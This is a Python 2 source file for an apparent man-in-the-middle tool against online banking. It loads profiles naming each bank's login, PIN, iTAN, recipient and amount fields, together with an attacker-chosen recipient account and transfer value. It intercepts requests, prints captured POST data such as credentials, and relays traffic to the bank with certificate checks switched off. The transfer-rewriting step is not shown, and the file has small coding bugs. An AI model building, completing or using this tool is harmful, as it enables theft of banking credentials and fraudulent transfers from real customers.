#!/usr/bin/python
# -*- coding: UTF-8 -*-

import httplib
import sys
import urllib
import socket
import ssl

from ConfigParser import RawConfigParser
from urlparse import parse_qs
from copy import deepcopy

CFGFILE='settings.cfg'

orig_data = {}

class HTTPSClientAuthConnection(httplib.HTTPSConnection):
    """ Class to make a HTTPS connection, with support for full client-based SSL Authentication"""

    def __init__(self, host, port, key_file, cert_file, ca_file, timeout=5):
        httplib.HTTPSConnection.__init__(self, host, key_file=key_file, cert_file=cert_file)
        self.key_file = key_file
        self.cert_file = cert_file
        self.ca_file = ca_file
        self.timeout = timeout

    def connect(self):
        """ Connect to a host on a given (SSL) port.
            If ca_file is pointing somewhere, use it to check Server Certificate.

            Redefined/copied and extended from httplib.py:1105 (Python 2.6.x).
            This is needed to pass cert_reqs=ssl.CERT_REQUIRED as parameter to ssl.wrap_socket(),
            which forces SSL to check server certificate against our client certificate.
        """
        sock = socket.create_connection((self.host, self.port), self.timeout)
        if self._tunnel_host:
            self.sock = sock
            self._tunnel()
        
        if self.ca_file:
            self.sock = ssl.wrap_socket(sock, self.key_file, self.cert_file, ca_certs=self.ca_file, cert_reqs=ssl.CERT_REQUIRED)
        else:
            self.sock = ssl.wrap_socket(sock, self.key_file, self.cert_file, cert_reqs=ssl.CERT_NONE)


class Colors:
    """ provide some fancy colors on the commandline """
    
    def __init__(self):
        self.colors = {}
        self.colors['green'] = '\033[92m'
        self.colors['yellow'] = '\033[93m'
        self.colors['red'] = '\033[91m'
        self.colors['blue']='\033[94m'      
        self.colors['end'] = '\033[0m'

    def cc_text(self, color, text):
        if not color in self.colors:
            print "color " + color + " not defined"
        return self.colors[color] + text + self.colors['end'] 

    def cc_ok(self, text):
        sys.stdout.write("[" + self.colors['green'] + "*" + self.colors['end']  + "] " + text)
        
    def cc_warn(self, text):
        sys.stdout.write("[" + self.colors['yellow'] + "*" + self.colors['end']  + "] " + text)

    def cc_err(self, text):
        sys.stdout.write("[" + self.colors['red'] + "*" + self.colors['end']  + "] " + text)

# Load configuration file
class Config:
    """ load configuration from settings.cfg """
    
    def get_config(self):
        try:
            return self.cfg,  self.banking_profiles
        except:
            self.configure()            
            return self.cfg,  self.banking_profiles
    
    def configure(self):
        ### colors ###
        self.cc = Colors()
        
        ### configuration ###
        self.cfg = {}
                
        ### banking profiles ###
        self.banking_profiles = {}
         
        ### load configuration file ###
        self.__load_config()        
        
    def __load_config(self):
        config = RawConfigParser()
        
        try:
            fp = open(CFGFILE)
        except IOError:
            return
        
        # read values
        config.readfp(fp)
        
        required_sections = ['HTTPS', 'BANKING']
        required_options = {'HTTPS': ['port', 'address', 'keyfile', 'certfile'],  'BANKING': ['account', 'blz',  'value',  'receipient']}

        for section in required_options:
            for option in required_options[section]:
                try:
                    self.cfg[option] = config.get(section,  option)
                except:
                    self.cc.cc_err("Missing configuration parameter: section: %s - option: %s\n" %  (section,  option))
                    sys.exit(1)
                
        # load user defined banking profiles
        bank_data = set(config.sections()) - set(required_sections)
        if not len(bank_data):
            self.cc.cc_err("No banking profile found in %s. Exiting.\n" % (CFGFILE, ))
            sys.exit(1)
            
        required_options = ['target_host',  'login_site',  'transfer_site',  'itan_site',  'login_field',  'pin_field' ,  'itan_field',  'receipient_field' ,  'value_field',  'acctnr_field',  'banknr_field',  'validate_sites' ]
        for bank in bank_data:
            self.cc.cc_warn("loading profile %s... " % (bank, ))
            self.banking_profiles[bank] = {}
            
            for option in required_options:
                try:
                    self.banking_profiles[bank][option] = config.get(bank,  option)
                except:
                    print self.cc.cc_text('red',"Failed!"), 
                    del self.banking_profiles[bank]
                    break                 
            
            print ""
                    
        print ""
        
        return   

# MITM Response Handling Class
class MITMResponseHandler:        
    def __init__(self, request,  profile,  cfg):
        self.request = request
        self.response = request.getresponse()
        self.status = self.response.status
        self.headers = self.response.getheaders()
        self.data = self.response.read()
        self.profile = profile
        self.cfg = cfg
        
    def status(self):
        return self.status
        
    def getheaders(self):
        return self.headers
        
    def read(self):
        return self.data
    
    def run(self):
            pass       

# MITM Request Handling Class
class MITMRequestHandler:
    def __init__(self, command,  path,  rfile,  headers,  profile,  cfg):
        self.command = command
        self.path = path
        self.headers = headers
        self.profile = profile
        self.cfg = cfg
        self.cc = Colors()
        
        try:
            self.data = rfile.read(int(self.headers["content-length"]))
        except:
            self.data = None
        
    def getresponse(self):
        return self.con.getresponse()
        
    def path(self):
        return self.path
        
    def command(self):
        return self.command
        
    def run(self):
        if self.command == "GET":
            self.con = HTTPSClientAuthConnection(self.profile['target_host'], 443, key_file=self.cfg['keyfile'], cert_file=self.cfg['certfile'], ca_file=None)
            self.con.request(self.command, self.path, self.data, dict(self.headers))            
            
        if self.command == "POST":                   
            if self.data:
                post_data = parse_qs(self.data, True)       
                self.cc.cc_ok("POST %s [ %s ]\n" % self.path,  self.data)
            else:
                self.cc.cc_ok("POST %s\n" % self.path)

            self.con = HTTPSClientAuthConnection(self.profile['target_host'], 443, key_file=self.cfg['keyfile'], cert_file=self.cfg['certfile'], ca_file=None)
            self.con.request(self.command, self.path, self.data, dict(self.headers))
